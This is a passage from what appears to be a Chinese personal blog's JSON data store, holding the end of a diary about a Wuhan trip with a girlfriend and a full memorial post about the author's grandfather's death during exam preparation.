聊起了人生，聊起了理想。</p>\n<p>“哔~~~~”（太长了，不想说了）</p>\n<p>（没心情了，有时间再补吧）</p>\n<p>第三天，户部巷，小吃，纹身，长江，请她们吃饭</p>\n<p>第四天，中山公园，鬼屋，银河护卫队</p>\n<p>第五天，呵呵</p>\n","excerpt":"<p><img src=\"http://cdn.duitang.com/uploads/item/201110/09/20111009103514_8ZeLM.jpg\" alt=\"\"><br>本来是想写写武汉的经历来着，不知不觉竟然发现，今天是自己的生日。姑且顺带着写写生日的小记好了。</p>","more":"<p>不得不说过去的这一年还真是对我影响很大的一年。学业技术上暂且不提，心理上的成长，应该是最大的改变了。毕竟是大四嘛，心理上的淬炼，真的让自己成长了很多。最大的变化或许就是自己更喜欢读书了，各种书，经济，心理，小说等等，不一而足。说白了这些爱好，开始接触的时候属于装装逼，显摆显摆自己多牛逼。后来看着看着发现，经济学尚且不论，这个心理学还真不是白看的。当真对自己的生活有着不可估量的影响。在这里顺道推荐一下心理学相关入门书籍，真心对于一个不谙世事的孩童来说，这方面书籍足够他们逐步成长了。</p>\n<p>好了生日的事情说完了，该说说去武汉玩的事情了（生日的事情真的说完了吗啊喂，简直不负责啊┑(￣Д ￣)┍）</p>\n<p>以前写点什么东西，心情是最重要的。心情到了就随手写写，往往能够写出比较满意的东西。只是可恨自己最近情绪到位的时候总是不方便写东西。只好趁着有一点闲时间的时候，不论心情，总结总结。</p>\n<p>首先说说武汉这座城市吧。</p>\n<p>说起武汉，那真是我向往已久的地方。无数个和我关系或者很好或者关系很奇怪的人，竟然都在武汉。他们的存在，让我从心底里接受了一个事实叫做，我和武汉，有着某种不可割裂的联系。去武汉感受一下生活，竟然隐隐成为了一项必须完成的任务。恍如昨日，五天前就着上完托福课程的开心劲，背着背包趁着夜色，踏上了飞往武汉的飞机。一路上火花闪电，心急如焚。</p>\n<p>关于出门游玩，本人坚持不拍照不逛景点的原则，去了一个城市，感受的不是所谓的名胜古迹，而是当地的风土人情。这些东西不需要过多的金钱，过多的时间。短短几天的生活与体会，足以了解到奔流在一个城市血脉中最原始的精神。</p>\n<p>而武汉给我的感觉，概括起来就是：性情，真诚。</p>\n<p>不同于北京的标准笑容，成都的满街风情，长沙的安逸随和，山西的古色古香。武汉给我的感觉，对于比较安逸稳定的服务人员来说，是一种发自真心的帮助与关心；对于忙碌求生的工作人员来说，则是一种迸发着真实的怒骂。区别于北京的分化严重，武汉的人们，更加倾向于中间化，是稳定憨厚的良民。他们有的不是出于名誉的目的，而是真心的提供各种服务；有的为了生计而忙碌不堪，态度冷淡。但是不论如何，总体的感觉是不变的。这是一座真诚，宁静的城市。</p>\n<p>好了，说完了武汉，接下来就是这次去武汉的重点了。</p>\n<p>这次去武汉，倒不是因为着急感受一下这个城市，最重要的还是因为，女朋友也在武汉。</p>\n<p>其实女朋友的事情吧，说起来也挺有意思的。不得不说现在的网络社会中，什么事情都能够发生。一款小小的社交软件，加上一个平时不怎么联系的中间人，竟然促成了如此一段的姻缘。在一起也就在一起了，本来无话可说，毕竟你情我愿，相互喜欢在一起也是在情理之中。但是透过这种渠道，这种被大多数人认为是不太靠谱的渠道，认识的女朋友也多数不会被认可。况且接下来等待我们的就是两年的异国生活。不被认可也是意料之中的事情。说回来了，随他去吧，这些事情不是现在考虑的重点，提一下过去就好了。</p>\n<p>和她在一起这些日子，真的可以归为今生最开心的一段时间之一了。为了方便不妨称其为W。W是一个活泼，娇小，而又成熟的女生。她的肩膀高度刚好到我腋下，伸手一揽就可以直接塞到胳膊底下，从而方便俯视她灿烂的笑容。她仰起头来的笑容，是我在离开后在大脑中最挥之不去的东西，时时在我脑中飘荡。或许我永远对这种可爱性情的小女生没有抵抗力吧。</p>\n<p>刚到武汉的第一天，应该是最尴尬的一天（哔..）。不过下午过得还是比较开心的。能在第一天就在电影院和女朋友看电影，还是徐峥黄渤的《心花路放》，真心心花怒放了。第一天的话两个人都比较小心，相互体谅着，小心着，倒也是相安无事的度过了这一天。</p>\n<p>第二天相对来说就很无语了。本来就犯懒，说好出去吃点东西玩一玩，计划10点起床出去，可是现实和想象的不太一样。</p>\n<p>“再睡一会儿，10点半起来好不好？”W迷迷糊糊的拽紧被子。</p>\n<p>“呐，那就10点半喽”</p>\n<p>“好像已经11点多了。。咱们12点出去好不好啊”W依旧迷迷糊糊。</p>\n<p>“好吧，应该也不算很晚吧”。。。</p>\n<p>“好像已经4点了诶，咱们4点40走吧，这次肯定不会再拖了”W这次倒是很清醒，坐在那里老老实实把这遥控器看着电视。</p>\n<p>“。。。”</p>\n<p>“好像已经4点43了，那咱们就5点喽，这次肯定没问题！”</p>\n<p>“。。。”</p>\n<p>这次我没有屈服，拽着她使劲往外扯，“从上午十点已经到了下午4点40了。。今天还能不能出去了！”，虽然对于成功把这团肥肉拖出去不抱什么希望，但是好歹试一下也是好的。</p>\n<p>最终还是我输了。“5点一定要走！”</p>\n<p>还好5点的时候这家伙倒是有点信用，穿好鞋收拾收拾，出门了。</p>\n<p>武汉的小吃说起来还真是蛮带感的。各种好吃的海鲜，龙虾，花甲，蛏子，果汁，热干面等等，不一而足。来武汉之前的减肥计划早已被抛到九霄云外。能吃多少吃多少，撑死也值了。就这样吃了好久，最终坐在那里，摸着肚子，感叹一句：“还是消化不良了。。。”</p>\n<p>忍着要吐的冲动，来到了W的大学，她拽着我去了药店，**牌健胃消食片到手，吃了两粒，顿觉心安。转身问问：“吃了这么多，你就不感觉到难受么。”这家伙倒是不像我那样疲惫不堪，仰起脸冲着我笑：“不难受啊，哪像你这么身体羸弱。”</p>\n<p>说起来还是挺郁闷的，本来来武汉的时候就感冒，咳咳咳咳咳个不停，消化功能还不好。这么饿了大半天没吃饭，一下来这么个猛料，顶不住是正常的。W倒是没什么异样，女生总是这样，有时候弱不禁风，有时候钢筋铁骨。</p>\n<p>吃饱喝足，洗澡睡觉。躺在床上，开始聊起了人生，聊起了理想。</p>\n<p>“哔~~~~”（太长了，不想说了）</p>\n<p>（没心情了，有时间再补吧）</p>\n<p>第三天，户部巷，小吃，纹身，长江，请她们吃饭</p>\n<p>第四天，中山公园，鬼屋，银河护卫队</p>\n<p>第五天，呵呵</p>"},{"title":"祭奠","date":"2014-02-06T10:40:20.000Z","_content":"不是文青，没有写点什么的习惯。只是今天实在百感交集，记录一下聊以慰藉。\n\n<!--more-->\n依稀记得老人坐在椅子上，在夕阳的余晖中絮絮叨叨：“鬼子啊，从城墙那里爬上来，猫着腰在墙上走。那时候大队长啊，就在城墙的一个墙根那里等着。。。。”\n\n由于心高气远，不住地想要前往洋人的土地求学，混乱中草率决定尝试出国。眼下还有几个月的时间，三个月GRE两个月托福，只能如此了。尤其是不满三分的绩点更是让人欲哭无泪。这些都是闲话，暂且可以不说。\n\n28号学完GRE课程，即可回家。那是大年廿八吧，中午坐车下午回家。回家后，满眼都是家乡的味道，十多年的成长，再熟悉不过了。身体疲惫天色已晚，洗洗睡了，倒也是一夜好梦。清早起来，经不住老妈的热情去买新衣服，神情紧张的试完衣服，偷偷溜了出来，留下老妈在店里和店员讨价还价。不一会儿，妈妈满意的提着衣服出来，前往姥爷家探望。一路都在夸耀这件衣服多么的好，给儿子买件好看的衣服，真心心花怒放，喜笑颜开。\n\n“昨天还能睁开眼来着，今天怎么不睁眼了？”老妈神态急迫得很，看着床上没力气睁眼的姥爷着急无奈。\n\n“是啊是啊，”大姨表示很无辜，轻拍姥爷的脸：“你外孙子来看你了！睁眼看看啊！”\n\n许久，无果。依旧是微闭的双眼，张着嘴喘气，像一条缺氧的大鱼。\n\n“没事吧！”大姨动手翻开姥爷的眼皮，摸摸脑门，“今天怎么眼都睁不开了呢，量量体温快！”对着姥爷大喊：“你外孙子回来啦！睁眼看看！”依旧没有任何反应。只是喘气显得更加疲惫了。\n\n老娘看了我一眼：“这都睁不开眼了，你也帮不上什么忙了，该忙你的忙你的吧，我和你大姨看着你姥爷好了。”\n\n若是转身就走，向来也不太合常理。在姥爷的病榻旁默立一会，微感无聊，看看老妈面对姥爷发烧各种着急的样子，想来也只能帮倒忙，只好默默地离开了。\n\n回到家，盯着电脑发呆。从小父母都忙，可以说记忆最深的都是在姥姥家长大的。作为为数不多的常驻劳动力，每天放学后，经常要完成的任务就是和表弟晓宇一起浇花。看着满院子的花花草草，那可都是姥姥的心肝宝贝啊，绝对不能怠慢！我和小表弟皱着眉头一盆盆的浇好，心里还默默地数着，“这个倒半瓢，这个是小半瓢，那个最大，需要倒一桶！”如此养的一院子的花花\n\n草草郁郁葱葱，生活虽然略显窘迫，倒也开心快乐。如此养了好多年，黄秋子树要砍掉了，南边的院子要盖楼了，满院子的花花草草无处安放，只好卖掉。姥爷趁着身体有力，推出板车，放好一盆盆各色各样的花，略微颤抖的推到街上。那时候的我跟在他后边，看着他跟买家讨价还价，“这可不能卖，这么多年了长得这么好，这点钱怎么卖！”买家一个个的离开了，好几天也卖不出去几盆花。都是曾经辛辛苦苦养出来的啊，怎么舍得就这么简单的卖掉了！眼看天色已黑，姥爷依旧是略微颤抖的推回板车，安放好一盆盆的花花草草，钻进屋子忙起家里的活。。。\n\n“你姥爷的情况真的是不好啊”，老妈回来了，“十来天前就坐不起来了，但是像今天这样还是第一次啊。”我走到妈妈的屋子，无言以对。难道能说是因为我回来的原因，冥冥之中自有天意么？无奈中只好唯唯诺诺：“人老了嘛，免不了生个病什么的，过几天就好了。”话虽然这么说，但是心里总还是没底的。依稀想起姥姥去世的时候，我好像也是这么说的，心里不由得一阵寒冷，转身离开，钻到自己屋子里，打开电脑，胡乱的翻着各种网页。心里默默的想着，希望姥爷能好起来。\n\n“看这样子你也帮不上什么忙了，不是要做你的数学建模吗，好好的做吧，家里的事情我来看着好了。”想想也是，于是撺掇撺掇队友，开始准备数学建模的事情。打算2号回学校，全力准备。\n\n“2号就要走么，大年初三是吧，那要赶紧把家里的那些好东西给你煮了。晓宇他妈给拿过来这么多虾，给你煎了吃了吧。”每次放假都是如此，从半年前上次放假就开始攒下来的好吃的，就等这次放假我回来煮给我吃。因此老妈的厨艺依旧糟糕，各种保鲜技术倒是长进了不少。盛情难却，各种鸡鸭鱼肉一起招呼，直希望我一天能把半年的东西都吃回来。满腹油水的离开家乡。\n\n要说回家了吧，时间过的就是快。转眼春节到了，大年初一走亲访友，姥爷依旧是无意识不睁眼状态。想来以前过年的时候，姥爷总是颤颤巍巍地从兜里拿出一张毛爷爷当做压岁钱给我们这些小辈，换来的也仅仅是一句看似普通的“姥爷过年好！”，和姥爷脸上憨憨的笑容。今年虽然压岁钱没少，送出来的人确是大姨。换来的是一个无奈的笑容和一个充满祥和的安慰。一起吃团圆饭，少了一个老人，少了一份祥和。\n\n匆匆忙忙的回到学校，迎来的无非是一个个疲惫的白天和一个个不安的夜晚。为了出国为了一个小小的奖，大过年的离开家乡，确是令人不爽。反思上大学以来，似乎每个假期都没有在家里度过过。不是这个集训，就是那个比赛。学术水平难以恭维不说，和家里人在一起的时间才是少了又少。心里暗自苦笑一番，这么苦到底是为了什么。看看人人上大家都在秀各种玩各种吃的照片，想想前几天英语班上认识的某位同学应该还在福州玩的痛快，心里不由得百感交集。生来劳碌，无可抱怨。\n\n在学校准备的日子一天天过去，就像恐怖游轮一样无聊永恒的循环。直到今天，蹲在厕所里边刷微博，看到了表弟的微博：\n\n真希望能像弟弟一样，什么都不懂，这样会免去很多痛苦吧。。。不过爸爸说的没错，爷爷能活88岁高龄，陪大家过了春节，临终前和家里儿孙也都见面了，没病没灾，儿女孝顺，死的时候也没有任何痛苦，对于全家人来说也许都应该为爷爷感到高兴吧，不说了，早点休息，接下来几天还有很多事要做的\n\n说实话，当时心里第一感觉是。。没感觉。只是想，临终前大家都在姥爷身边，而我不在，实在是太遗憾了。然后匆匆忙忙离开厕所，给老妈打电话，听着老妈忍着哭腔装作没事一样的语句，我才真切的感觉到一丝的悲痛。“你不用回来了，回来也帮不上什么忙，好好做你的比赛。等你弄完了再回来。”“我当然还是要回去的，这么大的事，我和队友商量商量”“你回来干嘛啊，用不到你，我们这些人忙活就好了”。。\n\n是啊，老妈说的所有的话，似乎只有一句，就是“这里用不到你，忙活你的就好了”。我还能说什么呢。二十多年了，他们似乎所有的事情都是在为我减轻负担。尤其是最近几年，上了大学之后，听到最多的或许就是“你干什么自己决定吧，我已经不知道你在干什么了。想清楚了做就是了，需要钱就跟我说，肯定够你花的。”早就习惯了生活的我，也只好说，“好吧，我弄完了马上回去”\n\n挂了电话，真的感觉我做的是什么事情啊！这些奖项，这些学习，真的有这么重要么？上大学这么长时间了，失去了这么多，我究竟得到了什么。这么做意义何在啊！大过年的，本来应该是在家好好陪陪父母，聊聊天的日子，却又有各种比赛，各种集训。仔细算算，究竟还有多长时间是能够陪在父母身边的呢。**基地不说，就是单独的竞赛，也会在过年早早的驱动起忙碌的我们，投入到无休无止的学习，工作中去。这样做，真的好吗？\n\n话虽如此，到了这一步，还是要继续的学习下去。依旧忙碌的学习，忙碌的准备。就像表弟的微博一样：\n\n爷爷过年该见的人都见了，就像我爸说的，儿女孝顺，自己也没受啥罪，活这么大岁数，也值得为爷爷高兴了，还是那句话，爷爷奶奶一辈子以这一家子大学生为骄傲，你安心学你的，拿个好成绩比你回来磕个头更能让爷爷欣慰，好好比赛\n\n很多时候吧，他比我更懂事。确实，作为一个家族来说，最大的快乐莫过于家族的后代都能够发展壮大。到这里了，还能在说什么呢。生活就是一个圈子，就算是看懂了，也无法逃脱。能做的只能是就着大家的期待，努力满足大家的期望。姥爷去世了，甚至应该是高兴的。为了姥爷一生行善的善终，为了姥爷能够和姥姥冥间继续厮守。无奈的我们，知道就着眼下的路子，无法回头的走下去。","source":"_posts/U796dU5960.md","raw":"title: 祭奠\ndate: 2014-2-6 10:40:20\ntags: Notes\ncategories: Notes\n---\n不是文青，没有写点什么的习惯。只是今天实在百感交集，记录一下聊以慰藉。\n\n<!--more-->\n依稀记得老人坐在椅子上，在夕阳的余晖中絮絮叨叨：“鬼子啊，从城墙那里爬上来，猫着腰在墙上走。那时候大队长啊，就在城墙的一个墙根那里等着。。。。”\n\n由于心高气远，不住地想要前往洋人的土地求学，混乱中草率决定尝试出国。眼下还有几个月的时间，三个月GRE两个月托福，只能如此了。尤其是不满三分的绩点更是让人欲哭无泪。这些都是闲话，暂且可以不说。\n\n28号学完GRE课程，即可回家。那是大年廿八吧，中午坐车下午回家。回家后，满眼都是家乡的味道，十多年的成长，再熟悉不过了。身体疲惫天色已晚，洗洗睡了，倒也是一夜好梦。清早起来，经不住老妈的热情去买新衣服，神情紧张的试完衣服，偷偷溜了出来，留下老妈在店里和店员讨价还价。不一会儿，妈妈满意的提着衣服出来，前往姥爷家探望。一路都在夸耀这件衣服多么的好，给儿子买件好看的衣服，真心心花怒放，喜笑颜开。\n\n“昨天还能睁开眼来着，今天怎么不睁眼了？”老妈神态急迫得很，看着床上没力气睁眼的姥爷着急无奈。\n\n“是啊是啊，”大姨表示很无辜，轻拍姥爷的脸：“你外孙子来看你了！睁眼看看啊！”\n\n许久，无果。依旧是微闭的双眼，张着嘴喘气，像一条缺氧的大鱼。\n\n“没事吧！”大姨动手翻开姥爷的眼皮，摸摸脑门，“今天怎么眼都睁不开了呢，量量体温快！”对着姥爷大喊：“你外孙子回来啦！睁眼看看！”依旧没有任何反应。只是喘气显得更加疲惫了。\n\n老娘看了我一眼：“这都睁不开眼了，你也帮不上什么忙了，该忙你的忙你的吧，我和你大姨看着你姥爷好了。”\n\n若是转身就走，向来也不太合常理。在姥爷的病榻旁默立一会，微感无聊，看看老妈面对姥爷发烧各种着急的样子，想来也只能帮倒忙，只好默默地离开了。\n\n回到家，盯着电脑发呆。从小父母都忙，可以说记忆最深的都是在姥姥家长大的。作为为数不多的常驻劳动力，每天放学后，经常要完成的任务就是和表弟晓宇一起浇花。看着满院子的花花草草，那可都是姥姥的心肝宝贝啊，绝对不能怠慢！我和小表弟皱着眉头一盆盆的浇好，心里还默默地数着，“这个倒半瓢，这个是小半瓢，那个最大，需要倒一桶！”如此养的一院子的花花\n\n草草郁郁葱葱，生活虽然略显窘迫，倒也开心快乐。如此养了好多年，黄秋子树要砍掉了，南边的院子要盖楼了，满院子的花花草草无处安放，只好卖掉。姥爷趁着身体有力，推出板车，放好一盆盆各色各样的花，略微颤抖的推到街上。那时候的我跟在他后边，看着他跟买家讨价还价，“这可不能卖，这么多年了长得这么好，这点钱怎么卖！”买家一个个的离开了，好几天也卖不出去几盆花。都是曾经辛辛苦苦养出来的啊，怎么舍得就这么简单的卖掉了！眼看天色已黑，姥爷依旧是略微颤抖的推回板车，安放好一盆盆的花花草草，钻进屋子忙起家里的活。。。\n\n“你姥爷的情况真的是不好啊”，老妈回来了，“十来天前就坐不起来了，但是像今天这样还是第一次啊。”我走到妈妈的屋子，无言以对。难道能说是因为我回来的原因，冥冥之中自有天意么？无奈中只好唯唯诺诺：“人老了嘛，免不了生个病什么的，过几天就好了。”话虽然这么说，但是心里总还是没底的。依稀想起姥姥去世的时候，我好像也是这么说的，心里不由得一阵寒冷，转身离开，钻到自己屋子里，打开电脑，胡乱的翻着各种网页。心里默默的想着，希望姥爷能好起来。\n\n“看这样子你也帮不上什么忙了，不是要做你的数学建模吗，好好的做吧，家里的事情我来看着好了。”想想也是，于是撺掇撺掇队友，开始准备数学建模的事情。打算2号回学校，全力准备。\n\n“2号就要走么，大年初三是吧，那要赶紧把家里的那些好东西给你煮了。晓宇他妈给拿过来这么多虾，给你煎了吃了吧。”每次放假都是如此，从半年前上次放假就开始攒下来的好吃的，就等这次放假我回来煮给我吃。因此老妈的厨艺依旧糟糕，各种保鲜技术倒是长进了不少。盛情难却，各种鸡鸭鱼肉一起招呼，直希望我一天能把半年的东西都吃回来。满腹油水的离开家乡。\n\n要说回家了吧，时间过的就是快。转眼春节到了，大年初一走亲访友，姥爷依旧是无意识不睁眼状态。想来以前过年的时候，姥爷总是颤颤巍巍地从兜里拿出一张毛爷爷当做压岁钱给我们这些小辈，换来的也仅仅是一句看似普通的“姥爷过年好！”，和姥爷脸上憨憨的笑容。今年虽然压岁钱没少，送出来的人确是大姨。换来的是一个无奈的笑容和一个充满祥和的安慰。一起吃团圆饭，少了一个老人，少了一份祥和。\n\n匆匆忙忙的回到学校，迎来的无非是一个个疲惫的白天和一个个不安的夜晚。为了出国为了一个小小的奖，大过年的离开家乡，确是令人不爽。反思上大学以来，似乎每个假期都没有在家里度过过。不是这个集训，就是那个比赛。学术水平难以恭维不说，和家里人在一起的时间才是少了又少。心里暗自苦笑一番，这么苦到底是为了什么。看看人人上大家都在秀各种玩各种吃的照片，想想前几天英语班上认识的某位同学应该还在福州玩的痛快，心里不由得百感交集。生来劳碌，无可抱怨。\n\n在学校准备的日子一天天过去，就像恐怖游轮一样无聊永恒的循环。直到今天，蹲在厕所里边刷微博，看到了表弟的微博：\n\n真希望能像弟弟一样，什么都不懂，这样会免去很多痛苦吧。。。不过爸爸说的没错，爷爷能活88岁高龄，陪大家过了春节，临终前和家里儿孙也都见面了，没病没灾，儿女孝顺，死的时候也没有任何痛苦，对于全家人来说也许都应该为爷爷感到高兴吧，不说了，早点休息，接下来几天还有很多事要做的\n\n说实话，当时心里第一感觉是。。没感觉。只是想，临终前大家都在姥爷身边，而我不在，实在是太遗憾了。然后匆匆忙忙离开厕所，给老妈打电话，听着老妈忍着哭腔装作没事一样的语句，我才真切的感觉到一丝的悲痛。“你不用回来了，回来也帮不上什么忙，好好做你的比赛。等你弄完了再回来。”“我当然还是要回去的，这么大的事，我和队友商量商量”“你回来干嘛啊，用不到你，我们这些人忙活就好了”。。\n\n是啊，老妈说的所有的话，似乎只有一句，就是“这里用不到你，忙活你的就好了”。我还能说什么呢。二十多年了，他们似乎所有的事情都是在为我减轻负担。尤其是最近几年，上了大学之后，听到最多的或许就是“你干什么自己决定吧，我已经不知道你在干什么了。想清楚了做就是了，需要钱就跟我说，肯定够你花的。”早就习惯了生活的我，也只好说，“好吧，我弄完了马上回去”\n\n挂了电话，真的感觉我做的是什么事情啊！这些奖项，这些学习，真的有这么重要么？上大学这么长时间了，失去了这么多，我究竟得到了什么。这么做意义何在啊！大过年的，本来应该是在家好好陪陪父母，聊聊天的日子，却又有各种比赛，各种集训。仔细算算，究竟还有多长时间是能够陪在父母身边的呢。**基地不说，就是单独的竞赛，也会在过年早早的驱动起忙碌的我们，投入到无休无止的学习，工作中去。这样做，真的好吗？\n\n话虽如此，到了这一步，还是要继续的学习下去。依旧忙碌的学习，忙碌的准备。就像表弟的微博一样：\n\n爷爷过年该见的人都见了，就像我爸说的，儿女孝顺，自己也没受啥罪，活这么大岁数，也值得为爷爷高兴了，还是那句话，爷爷奶奶一辈子以这一家子大学生为骄傲，你安心学你的，拿个好成绩比你回来磕个头更能让爷爷欣慰，好好比赛\n\n很多时候吧，他比我更懂事。确实，作为一个家族来说，最大的快乐莫过于家族的后代都能够发展壮大。到这里了，还能在说什么呢。生活就是一个圈子，就算是看懂了，也无法逃脱。能做的只能是就着大家的期待，努力满足大家的期望。姥爷去世了，甚至应该是高兴的。为了姥爷一生行善的善终，为了姥爷能够和姥姥冥间继续厮守。无奈的我们，知道就着眼下的路子，无法回头的走下去。","slug":"U796dU5960","published":1,"updated":"2016-06-08T20:21:15.000Z","comments":1,"layout":"post","photos":[],"link":"","_id":"ciph681vg0026wypd0lwajo6g","content":"<p>不是文青，没有写点什么的习惯。只是今天实在百感交集，记录一下聊以慰藉。</p>\n<a id=\"more\"></a>\n<p>依稀记得老人坐在椅子上，在夕阳的余晖中絮絮叨叨：“鬼子啊，从城墙那里爬上来，猫着腰在墙上走。那时候大队长啊，就在城墙的一个墙根那里等着。。。。”</p>\n<p>由于心高气远，不住地想要前往洋人的土地求学，混乱中草率决定尝试出国。眼下还有几个月的时间，三个月GRE两个月托福，只能如此了。尤其是不满三分的绩点更是让人欲哭无泪。这些都是闲话，暂且可以不说。</p>\n<p>28号学完GRE课程，即可回家。那是大年廿八吧，中午坐车下午回家。回家后，满眼都是家乡的味道，十多年的成长，再熟悉不过了。身体疲惫天色已晚，洗洗睡了，倒也是一夜好梦。清早起来，经不住老妈的热情去买新衣服，神情紧张的试完衣服，偷偷溜了出来，留下老妈在店里和店员讨价还价。不一会儿，妈妈满意的提着衣服出来，前往姥爷家探望。一路都在夸耀这件衣服多么的好，给儿子买件好看的衣服，真心心花怒放，喜笑颜开。</p>\n<p>“昨天还能睁开眼来着，今天怎么不睁眼了？”老妈神态急迫得很，看着床上没力气睁眼的姥爷着急无奈。</p>\n<p>“是啊是啊，”大姨表示很无辜，轻拍姥爷的脸：“你外孙子来看你了！睁眼看看啊！”</p>\n<p>许久，无果。依旧是微闭的双眼，张着嘴喘气，像一条缺氧的大鱼。</p>\n<p>“没事吧！”大姨动手翻开姥爷的眼皮，摸摸脑门，“今天怎么眼都睁不开了呢，量量体温快！”对着姥爷大喊：“你外孙子回来啦！睁眼看看！”依旧没有任何反应。只是喘气显得更加疲惫了。</p>\n<p>老娘看了我一眼：“这都睁不开眼了，你也帮不上什么忙了，该忙你的忙你的吧，我和你大姨看着你姥爷好了。”</p>\n<p>若是转身就走，向来也不太合常理。在姥爷的病榻旁默立一会，微感无聊，看看老妈面对姥爷发烧各种着急的样子，想来也只能帮倒忙，只好默默地离开了。</p>\n<p>回到家，盯着电脑发呆。从小父母都忙，可以说记忆最深的都是在姥姥家长大的。作为为数不多的常驻劳动力，每天放学后，经常要完成的任务就是和表弟晓宇一起浇花。看着满院子的花花草草，那可都是姥姥的心肝宝贝啊，绝对不能怠慢！我和小表弟皱着眉头一盆盆的浇好，心里还默默地数着，“这个倒半瓢，这个是小半瓢，那个最大，需要倒一桶！”如此养的一院子的花花</p>\n<p>草草郁郁葱葱，生活虽然略显窘迫，倒也开心快乐。如此养了好多年，黄秋子树要砍掉了，南边的院子要盖楼了，满院子的花花草草无处安放，只好卖掉。姥爷趁着身体有力，推出板车，放好一盆盆各色各样的花，略微颤抖的推到街上。那时候的我跟在他后边，看着他跟买家讨价还价，“这可不能卖，这么多年了长得这么好，这点钱怎么卖！”买家一个个的离开了，好几天也卖不出去几盆花。都是曾经辛辛苦苦养出来的啊，怎么舍得就这么简单的卖掉了！眼看天色已黑，姥爷依旧是略微颤抖的推回板车，安放好一盆盆的花花草草，钻进屋子忙起家里的活。。。</p>\n<p>“你姥爷的情况真的是不好啊”，老妈回来了，“十来天前就坐不起来了，但是像今天这样还是第一次啊。”我走到妈妈的屋子，无言以对。难道能说是因为我回来的原因，冥冥之中自有天意么？无奈中只好唯唯诺诺：“人老了嘛，免不了生个病什么的，过几天就好了。”话虽然这么说，但是心里总还是没底的。依稀想起姥姥去世的时候，我好像也是这么说的，心里不由得一阵寒冷，转身离开，钻到自己屋子里，打开电脑，胡乱的翻着各种网页。心里默默的想着，希望姥爷能好起来。</p>\n<p>“看这样子你也帮不上什么忙了，不是要做你的数学建模吗，好好的做吧，家里的事情我来看着好了。”想想也是，于是撺掇撺掇队友，开始准备数学建模的事情。打算2号回学校，全力准备。</p>\n<p>“2号就要走么，大年初三是吧，那要赶紧把家里的那些好东西给你煮了。晓宇他妈给拿过来这么多虾，给你煎了吃了吧。”每次放假都是如此，从半年前上次放假就开始攒下来的好吃的，就等这次放假我回来煮给我吃。因此老妈的厨艺依旧糟糕，各种保鲜技术倒是长进了不少。盛情难却，各种鸡鸭鱼肉一起招呼，直希望我一天能把半年的东西都吃回来。满腹油水的离开家乡。</p>\n<p>要说回家了吧，时间过的就是快。转眼春节到了，大年初一走亲访友，姥爷依旧是无意识不睁眼状态。想来以前过年的时候，姥爷总是颤颤巍巍地从兜里拿出一张毛爷爷当做压岁钱给我们这些小辈，换来的也仅仅是一句看似普通的“姥爷过年好！”，和姥爷脸上憨憨的笑容。今年虽然压岁钱没少，送出来的人确是大姨。换来的是一个无奈的笑容和一个充满祥和的安慰。一起吃团圆饭，少了一个老人，少了一份祥和。</p>\n<p>匆匆忙忙的回到学校，迎来的无非是一个个疲惫的白天和一个个不安的夜晚。为了出国为了一个小小的奖，大过年的离开家乡，确是令人不爽。反思上大学以来，似乎每个假期都没有在家里度过过。不是这个集训，就是那个比赛。学术水平难以恭维不说，和家里人在一起的时间才是少了又少。心里暗自苦笑一番，这么苦到底是为了什么。看看人人上大家都在秀各种玩各种吃的照片，想想前几天英语班上认识的某位同学应该还在福州玩的痛快，心里不由得百感交集。生来劳碌，无可抱怨。</p>\n<p>在学校准备的日子一天天过去，就像恐怖游轮一样无聊永恒的循环。直到今天，蹲在厕所里边刷微博，看到了表弟的微博：</p>\n<p>真希望能像弟弟一样，什么都不懂，这样会免去很多痛苦吧。。。不过爸爸说的没错，爷爷能活88岁高龄，陪大家过了春节，临终前和家里儿孙也都见面了，没病没灾，儿女孝顺，死的时候也没有任何痛苦，对于全家人来说也许都应该为爷爷感到高兴吧，不说了，早点休息，接下来几天还有很多事要做的</p>\n<p>说实话，当时心里第一感觉是。。没感觉。只是想，临终前大家都在姥爷身边，而我不在，实在是太遗憾了。然后匆匆忙忙离开厕所，给老妈打电话，听着老妈忍着哭腔装作没事一样的语句，我才真切的感觉到一丝的悲痛。“你不用回来了，回来也帮不上什么忙，好好做你的比赛。等你弄完了再回来。”“我当然还是要回去的，这么大的事，我和队友商量商量”“你回来干嘛啊，用不到你，我们这些人忙活就好了”。。</p>\n<p>是啊，老妈说的所有的话，似乎只有一句，就是“这里用不到你，忙活你的就好了”。我还能说什么呢。二十多年了，他们似乎所有的事情都是在为我减轻负担。尤其是最近几年，上了大学之后，听到最多的或许就是“你干什么自己决定吧，我已经不知道你在干什么了。想清楚了做就是了，需要钱就跟我说，肯定够你花的。”早就习惯了生活的我，也只好说，“好吧，我弄完了马上回去”</p>\n<p>挂了电话，真的感觉我做的是什么事情啊！这些奖项，这些学习，真的有这么重要么？上大学这么长时间了，失去了这么多，我究竟得到了什么。这么做意义何在啊！大过年的，本来应该是在家好好陪陪父母，聊聊天的日子，却又有各种比赛，各种集训。仔细算算，究竟还有多长时间是能够陪在父母身边的呢。**基地不说，就是单独的竞赛，也会在过年早早的驱动起忙碌的我们，投入到无休无止的学习，工作中去。这样做，真的好吗？</p>\n<p>话虽如此，到了这一步，还是要继续的学习下去。依旧忙碌的学习，忙碌的准备。就像表弟的微博一样：</p>\n<p>爷爷过年该见的人都见了，就像我爸说的，儿女孝顺，自己也没受啥罪，活这么大岁数，也值得为爷爷高兴了，还是那句话，爷爷奶奶一辈子以这一家子大学生为骄傲，你安心学你的，拿个好成绩比你回来磕个头更能让爷爷欣慰，好好比赛</p>\n<p>很多时候吧，他比我更懂事。确实，作为一个家族来说，最大的快乐莫过于家族的后代都能够发展壮大。到这里了，还能在说什么呢。生活就是一个圈子，就算是看懂了，也无法逃脱。能做的只能是就着大家的期待，努力满足大家的期望。姥爷去世了，甚至应该是高兴的。为了姥爷一生行善的善终，为了姥爷能够和姥姥冥间继续厮守。无奈的我们，知道就着眼下的路子，无法回头的走下去。</p>\n","excerpt":"<p>不是文青，没有写点什么的习惯。只是今天实在百感交集，记录一下聊以慰藉。</p>","more":"<p>依稀记得老人坐在椅子上，在夕阳的余晖中絮絮叨叨：“鬼子啊，从城墙那里爬上来，猫着腰在墙上走。那时候大队长啊，就在城墙的一个墙根那里等着。。。。”</p>\n<p>由于心高气远，不住地想要前往洋人的土地求学，混乱中草率决定尝试出国。眼下还有几个月的时间，三个月GRE两个月托福，只能如此了。尤其是不满三分的绩点更是让人欲哭无泪。这些都是闲话，暂且可以不说。</p>\n<p>28号学完GRE课程，即可回家。那是大年廿八吧，中午坐车下午回家。回家后，满眼都是家乡的味道，十多年的成长，再熟悉不过了。身体疲惫天色已晚，洗洗睡了，倒也是一夜好梦。清早起来，经不住老妈的热情去买新衣服，神情紧张的试完衣服